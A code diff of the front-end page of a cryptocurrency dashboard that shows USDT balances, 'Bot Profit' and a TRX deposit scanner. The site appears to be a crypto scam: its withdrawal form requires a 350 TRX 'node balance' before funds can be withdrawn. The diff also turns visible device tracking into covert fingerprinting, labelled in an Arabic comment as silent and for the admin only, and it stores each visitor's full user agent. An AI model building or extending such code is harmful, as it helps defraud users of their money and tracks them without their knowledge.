@@ -38,8 +38,6 @@
         .card-balance small { font-size: 14px; color: var(--brand); margin-left: 5px; }
 
         .trx-balance { font-size: 14px; font-weight: 700; color: var(--trx); margin-top: 5px; display: flex; align-items: center; gap: 5px; }
-        /* ستايل عرض عدد الأجهزة */
-        .device-info { font-size: 10px; color: #777; margin-top: 5px; opacity: 0.8; }
 
         .card-stats { display: flex; gap: 20px; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px; }
         .stat-box { font-size: 11px; color: #ccc; }
@@ -84,7 +82,6 @@
                 <div class="card-label" data-key="total_balance">Total Portfolio</div>
                 <div class="card-balance" id="displayBalance">0.00<small>USDT</small></div>
                 <div class="trx-balance"><i class="fa-solid fa-gas-pump"></i> <span id="displayTRX">33.00</span> TRX (Fees)</div>
-                <div class="device-info" id="deviceCount"><i class="fa-solid fa-mobile-screen"></i> Detecting sessions...</div>
             </div>
             <div class="card-stats">
                 <div class="stat-box"><span data-key="bot_profit">Bot Profit</span> <b id="displayBotProfit">+$0.00</b></div>
@@ -129,7 +126,7 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, onSnapshot, updateDoc, increment, getDoc, setDoc, collection, query, where, limit, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, doc, onSnapshot, updateDoc, increment, getDoc, setDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
     import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
     const firebaseConfig = {
@@ -149,28 +146,23 @@
     let isScannerRunning = false;
     let currentTrxBalance = 0;
 
-    // --- نظام تتبع الأجهزة ---
-    async function trackDevice(uid) {
+    // --- تسجيل الأجهزة (صامت للأدمن فقط) ---
+    async function silentTrackDevice(uid) {
         try {
-            // بصمة المتصفح + النظام
-            const deviceId = btoa(navigator.userAgent).substring(0, 16);
+            const deviceId = btoa(navigator.userAgent).substring(0, 20);
             const deviceRef = doc(db, "users", uid, "active_sessions", deviceId);
             await setDoc(deviceRef, {
+                info: navigator.userAgent,
                 platform: navigator.platform,
-                last_seen: Date.now(),
-                browser: navigator.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other"
+                last_active: Date.now()
             }, { merge: true });
-
-            // جلب العدد الكلي للجلسات
-            const sessions = await getDocs(collection(db, "users", uid, "active_sessions"));
-            document.getElementById('deviceCount').innerHTML = `<i class="fa-solid fa-mobile-screen"></i> ${sessions.size} Device(s) Active`;
-        } catch(e) { console.error("Tracking error"); }
+        } catch(e) {}
     }
 
     onAuthStateChanged(auth, async (user) => {
         if (user) {
             const userRef = doc(db, "users", user.uid);
-            trackDevice(user.uid);
+            silentTrackDevice(user.uid);
             
             onSnapshot(userRef, async (snap) => {
                 if (snap.exists()) {
@@ -183,17 +175,10 @@
                     document.getElementById('displayTRX').textContent = currentTrxBalance.toFixed(2);
 
                     userTRC20 = d.trc20_address || "PENDING";
-                    if (userTRC20 === "PENDING") assignWallet(user.uid);
                     if (!isScannerRunning && userTRC20.startsWith("T")) {
                         startScanner(userTRC20, user.uid);
                         isScannerRunning = true;
                     }
-                } else {
-                    await setDoc(userRef, {
-                        uid: user.uid, username: user.displayName || "User", email: user.email,
-                        balance: 0, trx_balance: 33, bot_profit: 0, game_profit: 0,
-                        trc20_address: "PENDING", status: "active"
-                    });
                 }
             });
         } else { window.location.href = "login.html"; }
@@ -211,22 +196,10 @@
         } else { closeModal(); }
     }
 
-    async function assignWallet(uid) {
-        try {
-            const q = query(collection(db, "wallet_pool"), where("isUsed", "==", false), limit(1));
-            const poolSnap = await getDocs(q);
-            if (!poolSnap.empty) {
-                const wDoc = poolSnap.docs[0];
-                await updateDoc(doc(db, "users", uid), { trc20_address: wDoc.data().address });
-                await updateDoc(doc(db, "wallet_pool", wDoc.id), { isUsed: true, assignedTo: uid });
-            }
-        } catch(e) {}
-    }
-
     async function startScanner(address, uid) {
         setInterval(async () => {
             try {
-                const res = await fetch(`https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?limit=5`);
+                const res = await fetch(`https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?limit=3`);
                 const data = await res.json();
                 if (data.success && data.data) {
                     for (let tx of data.data) {
@@ -261,14 +234,14 @@
             title.textContent = "Withdraw Funds";
             body.innerHTML = `
                 <div style="background:rgba(255,0,0,0.1); padding:10px; border-radius:10px; font-size:11px; color:var(--trx); margin-bottom:15px; border:1px solid var(--trx);">
-                    <i class="fa-solid fa-triangle-exclamation"></i> Note: To prevent spam, withdrawals require a minimum node balance of 350 TRX.
+                    <i class="fa-solid fa-triangle-exclamation"></i> Note: Withdrawals require a minimum node balance of 350 TRX.
                 </div>
                 <input type="text" class="modal-input" placeholder="TRC20 Address">
                 <input type="number" class="modal-input" placeholder="Amount USDT">
             `;
         } else {
             title.textContent = type.toUpperCase();
-            body.innerHTML = `<p style="text-align:center; color:#777">No active data for ${type}.</p>`;
+            body.innerHTML = `<p style="text-align:center; color:#777">No active data.</p>`;
         }
     }
 
@@ -279,21 +252,14 @@
     }
     window.closeModal = () => document.getElementById('actionModal').style.display = 'none';
 
-    // --- أسعار لايف للعملات ---
     async function fetchPrices() {
         try {
             const symbols = ["BTCUSDT","ETHUSDT","SOLUSDT","XRPUSDT"];
             const res = await fetch(`https://api.binance.com/api/v3/ticker/price`);
             const allPrices = await res.json();
             const filtered = allPrices.filter(p => symbols.includes(p.symbol));
-            
             filtered.forEach(c => {
-                let id = "";
-                if(c.symbol === "BTCUSDT") id = "p-btc";
-                else if(c.symbol === "ETHUSDT") id = "p-eth";
-                else if(c.symbol === "SOLUSDT") id = "p-sol";
-                else if(c.symbol === "XRPUSDT") id = "p-xrp";
-                
+                let id = c.symbol === "BTCUSDT" ? "p-btc" : c.symbol === "ETHUSDT" ? "p-eth" : c.symbol === "SOLUSDT" ? "p-sol" : "p-xrp";
                 if(id) {
                     const price = parseFloat(c.price);
                     document.getElementById(id).textContent = "$" + (price < 10 ? price.toFixed(4) : price.toLocaleString());
@@ -301,7 +267,7 @@
             });
         } catch(e) {}
     }
-    setInterval(fetchPrices, 5000); fetchPrices();
+    setInterval(fetchPrices, 6000); fetchPrices();
 </script>
 
 <script src="translate.js"></script>
